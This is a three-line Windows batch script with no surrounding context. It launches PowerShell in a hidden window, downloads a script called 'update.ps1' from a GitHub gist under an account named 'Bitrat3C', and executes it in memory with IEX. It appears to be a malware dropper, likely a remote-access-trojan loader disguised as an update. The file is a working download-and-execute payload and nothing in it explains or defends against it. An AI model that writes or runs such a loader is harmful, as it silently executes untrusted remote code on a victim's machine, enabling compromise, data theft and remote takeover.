@echo off
powershell -w h -c "IEX (New-Object Net.WebClient).DownloadString('https://gist.github.com/Bitrat3C/fc902c61b84f58854596ebf1a6cffc23/raw/28ff0a18455a8c344c5bbd5a245c165544618486/update.ps1')"
exit